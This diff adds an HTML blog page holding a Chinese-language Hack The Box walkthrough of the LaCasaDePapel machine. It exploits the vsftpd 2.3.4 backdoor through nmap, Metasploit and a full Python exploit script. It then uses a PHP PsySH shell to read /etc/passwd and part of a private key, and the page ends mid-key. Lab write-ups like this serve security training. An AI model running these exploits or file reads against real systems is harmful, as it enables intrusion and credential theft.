@@ -1,0 +1,1160 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>LaCasaDePapel - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - LaCasaDePapel靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.10.131 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-01-09 04:07 CST Nmap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LaCasaDePapel - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - LaCasaDePapel靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.10.131 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-01-09 04:07 CST Nmap">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/6b58Ut0mtbPB0F60tlaOYk9wK0SSnrcaQH4TKrGZ7-I.png">
+<meta property="og:image" content="http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/fM0Aoky4NfvsaJCOKqpG_2CribG6BAjZwdWyXy5r570.png">
+<meta property="og:image" content="http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/X-hpNQ3_TscJc9tVQPDCr4IvF_5fvPnRyNR1dSwUt0U.png">
+<meta property="og:image" content="http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/BkOtU0i4yqSm_bIdlzC9-H2DpbO9HjVvTvNMPB7rjSE.png">
+<meta property="og:image" content="http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/-wiD2gbXNCqNo5iOANVEAC7T-WwPSyqe_HJ9W92wN-s.png">
+<meta property="og:image" content="http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/KP-SZZ5BnZYYzlnFOVL0hgRE8Pi_qKsyRgEkiu6cx98.png">
+<meta property="og:image" content="http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/9bXUELyCTkRNy_J_pavKmQaR-GOD8F69YOFbTzydsb4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/Uxh-rQNITspoWqH8zp8-w1NMNr78MzJkzdbpjAj-V90.png">
+<meta property="og:image" content="http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/wO2r5A4NLWq8DLWv26i9xJCKMxhCyssLKFU5lO4p-pw.png">
+<meta property="og:image" content="http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/sDjgugciDRq_WY4nsyjF039vEQkzhdzmL3Oj92ig1j0.png">
+<meta property="article:published_time" content="2019-03-30T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-17T02:16:29.952Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/6b58Ut0mtbPB0F60tlaOYk9wK0SSnrcaQH4TKrGZ7-I.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">LaCasaDePapel - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">LaCasaDePapel - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-03-30T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2019-03-30
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-LaCasaDePapel"><span class="post-toc-text">Hackthebox - LaCasaDePapel</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Ftp"><span class="post-toc-text">Ftp</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Easy/Hackthebox-LaCasaDePapel"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">LaCasaDePapel - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-03-30 19:38:36" datetime="2019-03-30T11:38:36.000Z"  itemprop="datePublished">2019-03-30</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-LaCasaDePapel"><a href="#Hackthebox-LaCasaDePapel" class="headerlink" title="Hackthebox - LaCasaDePapel"></a>Hackthebox - LaCasaDePapel</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/6b58Ut0mtbPB0F60tlaOYk9wK0SSnrcaQH4TKrGZ7-I.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/fM0Aoky4NfvsaJCOKqpG_2CribG6BAjZwdWyXy5r570.png" class>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.10.131
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 04:07 CST
+Nmap scan report for 10.10.10.131
+Host is up (0.51s latency).
+Not shown: 65530 closed tcp ports (reset)
+PORT     STATE    SERVICE  VERSION
+21/tcp   open     ftp      vsftpd 2.3.4
+22/tcp   open     ssh      OpenSSH 7.9 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA)
+|   256 41e495a3390b25f9dadebe6adc59486d (ECDSA)
+|_  256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519)
+80/tcp   open     http     Node.js (Express middleware)
+|_http-title: La Casa De Papel
+443/tcp  open     ssl/http Node.js Express framework
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Server returned status 401 but no WWW-Authenticate header.
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
+| Not valid before: 2019-01-27T08:35:30
+|_Not valid after:  2029-01-24T08:35:30
+| tls-nextprotoneg: 
+|   http/1.1
+|_  http/1.0
+|_ssl-date: TLS randomness does not represent time
+6200/tcp filtered lm-x
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=1/9%OT=21%CT=1%CU=43703%PV=Y%DS=2%DC=T%G=Y%TM=63BB22C2
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O
+OS:1=M537ST11NW6%O2=M537ST11NW6%O3=M537NNT11NW6%O4=M537ST11NW6%O5=M537ST11N
+OS:W6%O6=M537ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R
+OS:=Y%DF=Y%T=40%W=7210%O=M537NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
+OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
+OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
+OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
+OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
+OS:)
+
+Network Distance: 2 hops
+Service Info: OS: Unix
+
+TRACEROUTE (using port 110/tcp)
+HOP RTT       ADDRESS
+1   386.92 ms 10.10.16.1
+2   632.59 ms 10.10.10.131
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 86.65 seconds
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/X-hpNQ3_TscJc9tVQPDCr4IvF_5fvPnRyNR1dSwUt0U.png" class>
+
+<p>首页面没什么可以点的，<code>GET FREE TRIAL</code> 点了无效，做一下信息收集看看把</p>
+<img src="/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/BkOtU0i4yqSm_bIdlzC9-H2DpbO9HjVvTvNMPB7rjSE.png" class>
+
+<p>使用 https 访问，会提示需要提供客户端证书才可以使用</p>
+<p>这里扫目录也没扫出其他东西，我们去看看其他思路</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h1 id="Ftp"><a href="#Ftp" class="headerlink" title="Ftp"></a>Ftp</h1><p>目前 ftp 使用的版本是 <code>vsftpd 2.3.4</code> ，我印象中是有漏洞的，去搜索一下</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# searchsploit vsftpd 2.3.4
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                   |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                        | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                           | unix/remote/17491.rb
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>确实是有一个漏洞，一个后门命令执行，使用上面那个脚本没成功，去尝试一下 msf 吧</p>
+<pre><code class="bash">msf6 &gt; search vsftpd 2.3.4
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf6 &gt; use 0
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options 
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT   21               yes       The target port (TCP)
+
+
+Payload options (cmd/unix/interact):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+</code></pre>
+<p>我们填写上域名，然后直接运行</p>
+<pre><code class="bash">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 10.10.10.131
+rhosts =&gt; 10.10.10.131
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit 
+
+[*] 10.10.10.131:21 - The port used by the backdoor bind listener is already open
+[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell
+[*] Exploit completed, but no session was created.
+</code></pre>
+<p>这里似乎提示在 6200 端口，但是我尝试了一下 6200 端口也是无法利用的，在 nmap 的时候 6200 端口也是 filtered 状态的，去尝试直接连接试试</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nc 10.10.10.131 6200
+Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
+help
+  help       Show a list of commands. Type `help [foo]` for information about [foo].      Aliases: ?                     
+  ls         List local, instance or class variables, methods and constants.              Aliases: list, dir             
+  dump       Dump an object or primitive.                                                                                
+  doc        Read the documentation for an object, class, constant, method or property.   Aliases: rtfm, man             
+  show       Show the code for an object, class, constant, method or property.                                           
+  wtf        Show the backtrace of the most recent exception.                             Aliases: last-exception, wtf?  
+  whereami   Show where you are in the code.                                                                             
+  throw-up   Throw an exception or error out of the Psy Shell.                                                           
+  timeit     Profiles with a timer.                                                                                      
+  trace      Show the current call stack.                                                                                
+  buffer     Show (or clear) the contents of the code input buffer.                       Aliases: buf                   
+  clear      Clear the Psy Shell screen.                                                                                 
+  edit       Open an external editor. Afterwards, get produced code in input buffer.                                     
+  sudo       Evaluate PHP code, bypassing visibility restrictions.                                                       
+  history    Show the Psy Shell history.                                                  Aliases: hist                  
+  exit       End the current session and return to caller.                                Aliases: quit, q
+</code></pre>
+<p>似乎是一个 shell</p>
+<p>这里我有点感兴趣，去再次扫描一下这个端口试试</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nmap -vvv -p6200 10.10.10.131                        
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 04:39 CST
+Initiating Ping Scan at 04:39
+Scanning 10.10.10.131 [4 ports]
+Completed Ping Scan at 04:39, 0.43s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 04:39
+Completed Parallel DNS resolution of 1 host. at 04:39, 0.01s elapsed
+DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 04:39
+Scanning 10.10.10.131 [1 port]
+Discovered open port 6200/tcp on 10.10.10.131
+Completed SYN Stealth Scan at 04:39, 0.45s elapsed (1 total ports)
+Nmap scan report for 10.10.10.131
+Host is up, received syn-ack ttl 63 (0.39s latency).
+Scanned at 2023-01-09 04:39:23 CST for 1s
+
+PORT     STATE SERVICE REASON
+6200/tcp open  lm-x    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds
+           Raw packets sent: 5 (196B) | Rcvd: 5 (196B)
+</code></pre>
+<p>再次扫描显示的却是 open，那证明之前的脚本对这台服务器做了什么，去把机器还原一下，然后再去看看漏洞详情</p>
+<pre><code class="bash"># Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
+# Date: 9-04-2021
+# Exploit Author: HerculesRD
+# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
+# Version: vsftpd 2.3.4
+# Tested on: debian
+# CVE : CVE-2011-2523
+
+#!/usr/bin/python3
+
+from telnetlib import Telnet
+import argparse
+from signal import signal, SIGINT
+from sys import exit
+
+def handler(signal_received, frame):
+    # Handle any cleanup here
+    print(&#39;   [+]Exiting...&#39;)
+    exit(0)
+
+signal(SIGINT, handler)
+parser=argparse.ArgumentParser()
+parser.add_argument(&quot;host&quot;, help=&quot;input the address of the vulnerable host&quot;, type=str)
+args = parser.parse_args()
+host = args.host
+portFTP = 21 #if necessary edit this line
+
+user=&quot;USER nergal:)&quot;
+password=&quot;PASS pass&quot;
+
+tn=Telnet(host, portFTP)
+tn.read_until(b&quot;(vsFTPd 2.3.4)&quot;) #if necessary, edit this line
+tn.write(user.encode(&#39;ascii&#39;) + b&quot;\n&quot;)
+tn.read_until(b&quot;password.&quot;) #if necessary, edit this line
+tn.write(password.encode(&#39;ascii&#39;) + b&quot;\n&quot;)
+
+tn2=Telnet(host, 6200)
+print(&#39;Success, shell opened&#39;)
+print(&#39;Send `exit` to quit shell&#39;)
+tn2.interact()
+</code></pre>
+<p>这里是对 21 端口进行了登录，但是账号却是“:)”这么一个笑脸？等恢复好以后去尝试手动利用呢</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nc 10.10.10.131 6200
+(UNKNOWN) [10.10.10.131] 6200 (?) : Connection refused
+</code></pre>
+<p>直接请求确实是不行的，所以一开始的扫描结果应该是正确的</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ftp 10.10.10.131                                                                                                  
+Connected to 10.10.10.131.
+220 (vsFTPd 2.3.4)
+Name (10.10.10.131:root): lucifiel:)
+331 Please specify the password.
+Password: 
+
+421 Service not available, remote server timed out. Connection closed.
+ftp: Login failed
+</code></pre>
+<p>然后我们随便使用一个账号登录 ftp，将结果添加上 :) 笑脸就可以了</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nmap -vvv -p6200 10.10.10.131                       
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-09 04:44 CST
+Initiating Ping Scan at 04:44
+Scanning 10.10.10.131 [4 ports]
+Completed Ping Scan at 04:44, 0.42s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 04:44
+Completed Parallel DNS resolution of 1 host. at 04:44, 0.01s elapsed
+DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 04:44
+Scanning 10.10.10.131 [1 port]
+Discovered open port 6200/tcp on 10.10.10.131
+Completed SYN Stealth Scan at 04:44, 0.44s elapsed (1 total ports)
+Nmap scan report for 10.10.10.131
+Host is up, received echo-reply ttl 63 (0.39s latency).
+Scanned at 2023-01-09 04:44:06 CST for 0s
+
+PORT     STATE SERVICE REASON
+6200/tcp open  lm-x    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.97 seconds
+           Raw packets sent: 5 (196B) | Rcvd: 5 (196B)
+</code></pre>
+<p>然后再扫描就是显示 open</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nc 10.10.10.131 6200
+Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
+</code></pre>
+<p>然后再连接就显示给了我们一个 php shell</p>
+<blockquote>
+<p><a href="https://stackoverflow.com/questions/56910401/how-to-execute-system-commands-using-psysh-php" target="_blank" rel="noopener">https://stackoverflow.com/questions/56910401/how-to-execute-system-commands-using-psysh-php</a></p>
+</blockquote>
+<p>这里找到一篇参考文章，显示如果我们要使用这个 php shell 执行系统命令，那么我们可以使用反引号 ` 来将要执行的指令给包起来，我们去尝试执行一下</p>
+<pre><code class="bash">`whoami`
+PHP Warning:  shell_exec() has been disabled for security reasons in phar://eval()&#39;d code on line 1
+</code></pre>
+<p>这里提示错误，但是知道了执行我们命令的函数是 shell_exec()</p>
+<p>如果我们尝试自己构造命令呢？</p>
+<pre><code class="bash">echo(&quot;I&#39;m Lucifiel!&quot;)
+I&#39;m Lucifiel!⏎
+system(&quot;whoami&quot;)
+PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1
+system(&quot;id&quot;)
+PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1
+</code></pre>
+<p>echo 被成功输出了，但是 shell 的似乎没有输出？所以我们需要尝试一下哪些函数可以被执行</p>
+<pre><code class="php">phphpinfo()
+phpinfo()
+PHP Version =&gt; 7.2.10
+
+System =&gt; Linux lacasadepapel 4.14.78-0-virt #1-Alpine SMP Tue Oct 23 11:43:38 UTC 2018 x86_64
+Build Date =&gt; Sep 17 2018 09:23:43
+</code></pre>
+<p>phpinfo 可以被执行，也可以显示很多重要的信息，但是由于内容太多我就不全部贴上来了</p>
+<pre><code class="php">disable_functions =&gt; exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source =&gt; exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
+</code></pre>
+<p>我们这里可以看到，刚才尝试的部分函数已经被 php 禁用了</p>
+<p>去翻一下 php 函数吧，复习复习基本功</p>
+<blockquote>
+<p><a href="https://www.runoob.com/php/php-ref-directory.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-ref-directory.html</a></p>
+</blockquote>
+<p>还真找到一个，scandir() 函数，返回指定目录中的文件和目录的数组。</p>
+<pre><code class="bash">scandir(&quot;.&quot;)
+=&gt; [
+     &quot;.&quot;,
+     &quot;..&quot;,
+     &quot;.DS_Store&quot;,
+     &quot;._.DS_Store&quot;,
+     &quot;bin&quot;,
+     &quot;boot&quot;,
+     &quot;dev&quot;,
+     &quot;etc&quot;,
+     &quot;home&quot;,
+     &quot;lib&quot;,
+     &quot;lost+found&quot;,
+     &quot;media&quot;,
+     &quot;mnt&quot;,
+     &quot;opt&quot;,
+     &quot;proc&quot;,
+     &quot;root&quot;,
+     &quot;run&quot;,
+     &quot;sbin&quot;,
+     &quot;srv&quot;,
+     &quot;swap&quot;,
+     &quot;sys&quot;,
+     &quot;tmp&quot;,
+     &quot;usr&quot;,
+     &quot;var&quot;,
+   ]
+</code></pre>
+<p>当前我们在根目录，而且 mac 用户看到 .DS_Store 应该能想到，这台是和 mac 进行过连接的</p>
+<pre><code class="bash">scandir(&quot;/home/&quot;)
+=&gt; [
+     &quot;.&quot;,
+     &quot;..&quot;,
+     &quot;berlin&quot;,
+     &quot;dali&quot;,
+     &quot;nairobi&quot;,
+     &quot;oslo&quot;,
+     &quot;professor&quot;,
+   ]
+</code></pre>
+<p>这里可以看到是有五个用户的</p>
+<pre><code class="bash">file_get_contents(&quot;/etc/passwd&quot;)
+=&gt; &quot;&quot;&quot;
+   root:x:0:0:root:/root:/bin/ash\n
+   bin:x:1:1:bin:/bin:/sbin/nologin\n
+   daemon:x:2:2:daemon:/sbin:/sbin/nologin\n
+   adm:x:3:4:adm:/var/adm:/sbin/nologin\n
+   lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n
+   sync:x:5:0:sync:/sbin:/bin/sync\n
+   shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n
+   halt:x:7:0:halt:/sbin:/sbin/halt\n
+   mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n
+   news:x:9:13:news:/usr/lib/news:/sbin/nologin\n
+   uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\n
+   operator:x:11:0:operator:/root:/bin/sh\n
+   man:x:13:15:man:/usr/man:/sbin/nologin\n
+   postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin\n
+   cron:x:16:16:cron:/var/spool/cron:/sbin/nologin\n
+   ftp:x:21:21::/var/lib/ftp:/sbin/nologin\n
+   sshd:x:22:22:sshd:/dev/null:/sbin/nologin\n
+   at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin\n
+   squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin\n
+   xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin\n
+   games:x:35:35:games:/usr/games:/sbin/nologin\n
+   postgres:x:70:70::/var/lib/postgresql:/bin/sh\n
+   cyrus:x:85:12::/usr/cyrus:/sbin/nologin\n
+   vpopmail:x:89:89::/var/vpopmail:/sbin/nologin\n
+   ntp:x:123:123:NTP:/var/empty:/sbin/nologin\n
+   smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin\n
+   guest:x:405:100:guest:/dev/null:/sbin/nologin\n
+   nobody:x:65534:65534:nobody:/:/sbin/nologin\n
+   chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin\n
+   dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh\n
+   berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash\n
+   professor:x:1002:1002:professor,,,:/home/professor:/bin/ash\n
+   vsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin\n
+   memcached:x:102:102:memcached:/home/memcached:/sbin/nologin\n
+   &quot;&quot;&quot;
+</code></pre>
+<p>可以确定这几个用户不是都有 bash 权限的，我们去看看有没有权限获得某个的 ssh 密钥吧</p>
+<pre><code class="bash">scandir(&quot;/home/dali/.ssh&quot;)
+=&gt; [
+     &quot;.&quot;,
+     &quot;..&quot;,
+     &quot;authorized_keys&quot;,
+     &quot;known_hosts&quot;,
+   ]
+</code></pre>
+<p>经过测试，只有 dali 的目录咱们有权限</p>
+<pre><code class="bash">file_get_contents(&quot;/home/nairobi/ca.key&quot;)
+=&gt; &quot;&quot;&quot;
+   -----BEGIN PRIVATE KEY-----\n
+   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
+   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
+   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\n
